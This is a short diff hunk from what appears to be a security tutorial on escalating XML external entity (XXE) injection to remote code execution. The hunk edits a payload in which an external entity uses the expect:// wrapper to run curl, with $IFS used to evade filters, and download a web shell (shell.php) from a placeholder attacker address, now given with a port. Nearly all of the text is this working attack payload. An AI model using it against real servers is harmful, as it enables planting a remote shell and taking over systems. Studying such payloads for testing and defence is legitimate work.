@@ -8,7 +8,7 @@ The most efficient method to turn XXE into an RCE is by implanting a reverse she
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE email [
-  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP:OUR_PORT/shell.php'">
 ]>
 <root>
 <name></name>
